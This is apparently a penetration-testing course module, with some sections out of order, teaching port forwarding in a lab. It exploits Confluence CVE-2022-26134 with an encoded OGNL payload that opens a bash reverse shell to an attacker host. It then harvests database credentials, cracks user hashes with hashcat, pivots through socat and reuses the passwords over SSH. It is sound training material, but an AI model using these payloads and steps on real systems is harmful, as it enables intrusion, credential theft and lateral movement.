Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

